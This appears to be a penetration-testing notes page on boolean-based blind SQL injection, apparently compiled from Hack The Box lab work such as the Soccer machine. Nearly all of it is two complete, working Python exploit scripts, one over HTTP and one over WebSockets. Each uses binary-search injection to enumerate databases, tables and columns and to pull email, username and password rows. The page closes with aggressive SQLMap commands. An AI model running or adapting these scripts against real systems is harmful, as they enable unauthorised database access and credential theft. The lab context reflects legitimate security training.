---
Primary_category: "[[BLIND SQLI]]"
title: "BOOLEAN BASED SQLI"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[BLIND SQLI]]

#### *Theory*

> 🛠️⌛

---

#### *Abuse*

##### *HTTP[s]*

- ***Custom Python Script***

> ***Binary Search***

> [!BUG]- *Sample*
>
> ```python
> #!/usr/bin/env python3
> 
> from colorama import Fore, Style
> from pwn import *
> 
> import sys
> import requests
> 
> class Exploit:
> 
>     def __init__(self, ip: str, port: int) -> None:
> 
>         self.url = f"http://{ip}:{port}/case6.php"
>         self.session = requests.Session()
>         self.length = 2300
> 
>     def _makeRequest(self, data: str) -> requests.Response:
> 
>         try:
>             return self.session.get(self.url + data)
> 
>         except requests.exceptions.RequestException as e:
> 
>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
>             sys.exit(1)
> 
>     def _binarySearch(self, low: str, high: str, query: str) -> int:
> 
>         while low < high:
> 
>             mid = ( low + high ) // 2
> 
>             payload = f"?col=id`) OR ({query}) > {mid} -- -"
> 
>             r = self._makeRequest(payload)
> 
>             resp_length = len(r.content)
> 
>             if resp_length > self.length:
> 
>                 low = mid + 1 
> 
>             else:
>                 high = mid
> 
>         return low
> 
>     def _getCount(self, target: str, db: str = None, table: str = None) -> int:
> 
>         if target == "db":
> 
>             query = f"""
>                      SELECT COUNT(schema_name)
>                      FROM information_schema.schemata
>                      """
> 
>         elif target == "table":
> 
>             query = f"""
>                      SELECT COUNT(table_name)
>                      FROM information_schema.tables
>                      WHERE table_schema = '{db}'
>                      """
> 
>         elif target == "column":
> 
>             query = f"""
>                      SELECT COUNT(column_name)
>                      FROM information_schema.columns
>                      WHERE table_name = '{table}' AND table_schema = '{db}'
>                      """
> 
>         else:
>             query = f"""
>                      SELECT COUNT(*)
>                      FROM {db}.{table}
>                      """
> 
>         return self._binarySearch(0, 10, query)
> 
> 
>     def _getLength(self, index: int, target: str, db: str = None, table: str = None, columns: list = None) -> int:
> 
>         if target == "db":
> 
>             query = f"""SELECT LENGTH(schema_name)
>                         FROM information_schema.schemata
>                         LIMIT {index},1
>                        """
>         elif target == "table":
> 
>             query = f"""SELECT LENGTH(table_name)
>                         FROM information_schema.tables
>                         WHERE table_schema = '{db}'
>                         LIMIT {index},1
>                        """
>         elif target == "column":
> 
>             query = f"""SELECT LENGTH(column_name)
>                         FROM information_schema.columns
>                         WHERE table_name = '{table}' AND table_schema = '{db}'
>                         LIMIT {index},1
>                        """
>         else:
>             query = f"""SELECT LENGTH(CONCAT_WS(', ', {','.join(map(str, columns))}))
>                         FROM {db}.{table}
>                         LIMIT {index},1
>                     """
> 
>         return self._binarySearch(0, 250, query)
> 
>     def _getChar(self, index: int, position: int, target: str, db : str = None, table: str = None, columns: list = None) -> str:
> 
>         if target == "db":
> 
>             query = f"""ORD(MID((
>                         SELECT schema_name
>                         FROM information_schema.schemata
>                         LIMIT {index},1
>                         ),{position},1))
>                      """
>         elif target == "table":
> 
>             query = f"""ORD(MID((
>                         SELECT table_name
>                         FROM information_schema.tables
>                         WHERE table_schema = '{db}'
>                         LIMIT {index},1
>                         ),{position},1))
>                      """
>         elif target == "column":
> 
>             query = f"""ORD(MID((
>                         SELECT column_name
>                         FROM information_schema.columns
>                         WHERE table_schema = '{db}' AND table_name = '{table}'
>                         LIMIT {index},1
>                         ),{position},1))
>                      """
>         else:
>             query = f"""
>                      ORD(MID((
>                      SELECT CONCAT_WS(', ', {','.join(map(str, columns))})
>                      FROM {db}.{table}
>                      LIMIT {index},1
>                      ),{position},1))
>                      """
> 
>         return chr(self._binarySearch(32, 126, query))
> 
>     def _getDBs(self) -> list:
> 
>         databases = []
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>         p1.status(Fore.MAGENTA + "Extracting Databases..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + "Databases" + Style.RESET_ALL)
> 
>         ndb = self._getCount("db")
> 
>         for index in range(ndb):
> 
>             db_length = self._getLength(index, "db")
> 
>             db = ""
> 
>             for position in range(1, db_length + 1):
> 
>                 char = self._getChar(index, position, "db")
> 
>                 p2.status(Fore.MAGENTA + db + char + Style.RESET_ALL)
> 
>                 db += char
> 
>             databases.append(db)
> 
>         p2.success(Fore.GREEN + str(databases) + Style.RESET_ALL)
> 
>         return databases
> 
>     def _getTables(self, db: str) -> list:
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>         p1.status(Fore.MAGENTA + f"Extracting tables for {db} database..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + f"DB Tables for {db}" + Style.RESET_ALL)
> 
>         tables = [ ]
> 
>         n_tables = self._getCount("table", db)
> 
>         for index in range(n_tables):
> 
>             tb_length = self._getLength(index, "table", db)
> 
>             table = ""
> 
>             for position in range(1, tb_length + 1):
> 
>                 char = self._getChar(index, position, "table", db)
> 
>                 p2.status(Fore.MAGENTA + table + char + Style.RESET_ALL)
> 
>                 table += char
> 
>             tables.append(table)
> 
>         p2.success(Fore.GREEN + str(tables) + Style.RESET_ALL)
> 
>         return tables
> 
>     def _getColumns(self, db: str, table: str) -> list:
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>         p1.status(Fore.MAGENTA + f"Extracting columns for {db}.{table} table..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + f"Table columns for {db}.{table}" + Style.RESET_ALL)
> 
>         columns = [ ]
> 
>         n_cols = self._getCount("column", db, table)
> 
>         for index in range(n_cols):
> 
>             column_length = self._getLength(index, "column", db, table)
> 
>             column = ""
> 
>             for position in range(1, column_length + 1):
> 
>                 char = self._getChar(index, position, "column", db, table)
> 
>                 p2.status(Fore.MAGENTA + column + char + Style.RESET_ALL)
> 
>                 column += char
> 
>             columns.append(column)
> 
>         p2.success(Fore.GREEN + str(columns) + Style.RESET_ALL)
> 
>         return columns
> 
>     def _getData(self, db:str, table:str, columns: list) -> None:
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>         p1.status(Fore.MAGENTA + f"Extracting data from {db}.{table}..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + f"Data for {db}.{table}" + Style.RESET_ALL)
> 
>         columns = [ columns[1], columns[-1] ]
> 
>         rows = [ ]
> 
>         n_data = self._getCount("data", db, table)
> 
>         try:
>             for index in range(n_data):
> 
>                 data = ""
> 
>                 data_length = self._getLength(index, "data", db, table, columns)
> 
>                 for position in range(1, data_length + 1):
> 
>                     char = self._getChar(index, position, "data", db, table, columns)
> 
>                     p2.status(Fore.MAGENTA + data + char + Style.RESET_ALL)
> 
>                     data += char
> 
>                 rows.append(data)
> 
>         except: pass
> 
>         p2.success(Fore.GREEN + "All data already extracted!" + Style.RESET_ALL)
> 
>         print()
>         [ print(Fore.CYAN + row + Style.RESET_ALL) for row in rows ]
> 
>     def _RUN(self) -> None:
> 
>         #dbs = self._getDBs()
> 
>         #tables = self._getTables(dbs[1])
> 
>         #cols0 = self._getColumns(dbs[1], tables[0])
> 
>         #cols1 = self._getColumns(dbs[1], tables[1])
> 
>         #self._getData(dbs[1], tables[0], cols0)
> 
>         #self._getData(dbs[1], tables[1], cols1)
> 
> if __name__ == '__main__':
> 
>     exploit = Exploit("154.57.164.74", 30320)
> 
>     exploit._RUN()
> ```
>

- ***[SQLMap](https://github.com/sqlmapproject/sqlmap)***

> ***See [[SQLMAP|SQLMap]]***

##### *WebSockets*

- ***Custom Python Script***

> ***Binary Search***

> [!BUG]- *Sample*
>
> ```python
> #!/usr/bin/env python3
> 
> from websocket import create_connection
> from pwn import *
> from colorama import Fore, Style
> 
> import sys
> import json
> 
> class Exploit:
> 
>     def __init__(self, url):
> 
>         self.url = url
> 
>     def _makeRequest(self, data: str) -> str:
> 
>         data = {
>             "id" : data
>         }
> 
>         ws = create_connection(self.url, timeout=10)
> 
>         try:
>             ws.send(json.dumps(data))
> 
>             return ws.recv()
> 
>         except Exception as e:
> 
>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
>             sys.exit(1)
> 
>         finally:
> 
>             ws.close()
> 
>     def _binarySearch(self, low: int, high: int, query: str) -> int:
> 
>         while low < high:
> 
>             mid = ( low + high ) // 2
> 
>             payload = f'1 OR ({query}) > {mid} -- -'
> 
>             r = self._makeRequest(payload)
> 
>             if "Ticket Exists" in r:
> 
>                 low = mid + 1
> 
>             else: high = mid
> 
>         return low
> 
>     def _getCount(self, target: str, db: str = None, table: str = None) -> int:
> 
>         if target == 'db':
> 
>             query = '''
>                     SELECT COUNT(schema_name) 
>                     FROM information_schema.schemata
>                     '''
>         elif target == 'table':
> 
>             query = f'''
>                     SELECT COUNT(table_name)
>                     FROM information_schema.tables
>                     WHERE table_schema = "{db}"
>                     '''
> 
>         elif target == 'column':
> 
>             query = f'''
>                     SELECT COUNT(column_name)
>                     FROM information_schema.columns
>                     WHERE table_name = "{table}" AND table_schema = "{db}"
>                     '''
> 
>         else:
>             query = f"""
>                      SELECT COUNT(*)
>                      FROM {db}.{table}
>                      """
> 
>         return self._binarySearch(0, 50, query)
> 
>     def _getLength(self, target: str, index: int, db: str = None, table: str = None, columns: list = None) -> int:
> 
>         if target == 'db':
> 
>             query = f''' 
>                     LENGTH((
>                     SELECT schema_name
>                     FROM information_schema.schemata
>                     LIMIT {index},1
>                     ))
>                     '''
>         
>         elif target == 'table':
> 
>             query = f'''
>                     LENGTH((
>                     SELECT table_name
>                     FROM information_schema.tables
>                     WHERE table_schema = '{db}'
>                     LIMIT {index},1
>                     ))
>                     '''
>             
>         elif target == 'column':
> 
>             query = f'''
>                     LENGTH((
>                     SELECT column_name
>                     FROM information_schema.columns
>                     WHERE table_name = '{table}' AND table_schema = '{db}'
>                     LIMIT {index},1
>                     ))
>                     '''
>         else:
>             query = f'''
>                     SELECT LENGTH(CONCAT_WS(', ', {','.join(map(str, columns))}))
>                     FROM {db}.{table}
>                     LIMIT {index},1
>                     '''
> 
>         return self._binarySearch(0, 250, query)
> 
>     def _getChar(self, target: str, index: int, position: int, db: str = None, table: str = None, columns: list = None) -> str:
> 
>         if target == 'db':
> 
>             query = f'''
>                     ORD(
>                     MID((
>                     SELECT schema_name
>                     FROM information_schema.schemata
>                     LIMIT {index},1
>                     )
>                     ,{position},1)
>                     )
>                     '''
> 
>         elif target == 'table':
> 
>             query = f'''
>                     ORD(
>                     MID((
>                     SELECT table_name
>                     FROM information_schema.tables
>                     WHERE table_schema = '{db}'
>                     LIMIT {index},1
>                     )
>                     ,{position},1)
>                     )
>                     '''
> 
>         elif target == 'column':
> 
>             query = f'''
>                     ORD(
>                     MID((
>                     SELECT column_name
>                     FROM information_schema.columns
>                     WHERE table_name = '{table}' AND table_schema = '{db}'
>                     LIMIT {index},1
>                     )
>                     ,{position},1)
>                     )
>                     '''
>         else:
>             query = f"""
>                      ORD(MID((
>                      SELECT CONCAT_WS(', ', {','.join(map(str, columns))})
>                      FROM {db}.{table}
>                      LIMIT {index},1
>                      ),{position},1))
>                      """
> 
>         return chr(self._binarySearch(32, 126, query))
> 
>     def _getDBs(self) -> list:
> 
>         dbs = [ ]
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>         p1.status(Fore.MAGENTA + "Enumerating databases..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + "Databases" + Style.RESET_ALL)
> 
>         dbs_number = self._getCount("db")
> 
>         for index in range(dbs_number):
> 
>             db_length = self._getLength("db", index)
> 
>             db = ""
> 
>             for position in range(1, db_length + 1):
> 
>                 char = self._getChar("db", index, position)
> 
>                 p2.status(Fore.MAGENTA + db + char + Style.RESET_ALL)
> 
>                 db += char
> 
>             dbs.append(db)
> 
>         p2.success(Fore.GREEN + str(dbs) + Style.RESET_ALL)
> 
>         return dbs
> 
>     def _getTables(self, db: str) -> list:
> 
>         tables = [ ]
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi")
>         p1.status(Fore.MAGENTA + f"Enumerating tables in {db} database..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + "Tables" + Style.RESET_ALL)
> 
>         tables_number = self._getCount("table", db)
> 
>         for index in range(tables_number):
>         
>             table_length = self._getLength("table", index, db)
> 
>             table = ""
> 
>             for position in range(1, table_length + 1):
> 
>                 char = self._getChar("table", index, position, db)    
> 
>                 p2.status(Fore.MAGENTA + table + char + Style.RESET_ALL)
>                 
>                 table += char
> 
>             tables.append(table)
> 
>         p2.success(Fore.GREEN + str(tables) + Style.RESET_ALL)
> 
>         return tables
> 
>     def _getColumns(self, db: str, table: str) -> list:
> 
>         columns = [ ]
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>         p1.status(Fore.MAGENTA + f"Enumerating columns for {db}.{table} table..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + "Columns" + Style.RESET_ALL)
> 
>         columns_number = self._getCount("column", db, table)
> 
>         for index in range(columns_number):
> 
>             column_length = self._getLength("column", index, db, table)
> 
>             column = ""
> 
>             for position in range(1, column_length + 1):
> 
>                 char = self._getChar("column", index, position, db, table)
> 
>                 p2.status(Fore.MAGENTA + column + char + Style.RESET_ALL)
> 
>                 column += char
> 
>             columns.append(column)
> 
>         p2.success(Fore.GREEN + str(columns) + Style.RESET_ALL)
> 
>         return columns
> 
>     def _getData(self, db: str, table: str, columns: list) -> None:
> 
>         rows = [ ]
> 
>         print()
>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
>         p1.status(Fore.MAGENTA + f"Extracting {columns} from {db}.{table}..." + Style.RESET_ALL)
> 
>         print()
>         p2 = log.progress(Fore.CYAN + "Data" + Style.RESET_ALL)
> 
>         rows_number = self._getCount("data", db, table)
> 
>         for index in range(rows_number):
> 
>             row_length = self._getLength("data", index, db, table, columns)
> 
>             row = ""
> 
>             for position in range(1, row_length + 1):
> 
>                 char = self._getChar("data", index, position, db, table, columns)
> 
>                 p2.status(Fore.MAGENTA + row + char + Style.RESET_ALL)
> 
>                 row += char
> 
>             rows.append(row)
> 
>         p2.success(Fore.GREEN + str(rows) + Style.RESET_ALL)
> 
>         return rows
> 
>     def _run(self):
> 
>         #print(self._getCount("db"))
> 
>         #print(self._getLength("db", 0))
> 
>         #print(self._getChar("db", 1, 1))
> 
>         #self._getDBs()
> 
>         #self._getTables("soccer_db")
> 
>         #columns = self._getColumns("soccer_db", "accounts")
> 
>         self._getData("soccer_db", "accounts", [ 'email', 'username', 'password' ])
> 
> if __name__ == '__main__':
> 
>     exploit = Exploit("ws://soc-player.soccer.htb:9091")
>     exploit._run()
> ```
>

- ***[SQLMap](https://github.com/sqlmapproject/sqlmap)***

***Setup***

```bash
git clone 'https://github.com/sqlmapproject/sqlmap' SQLMap
cd !$
```

***Usage***

```bash
python3 sqlmap.py --url 'ws://<TARGET>:<PORT>' --data '{ "<PARAMETER>" : "*" }' --level 5 --risk 3 --random-agent --batch --threads 10
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 sqlmap.py --url 'ws://10.10.10.5:9091' --data '{ "id" : "*" }' --level 5 --risk 3 --random-agent --batch --threads 10
> ```
>

###### *Resources*

***[Soccer Machine HTB](https://www.hackthebox.com/machines/Soccer)***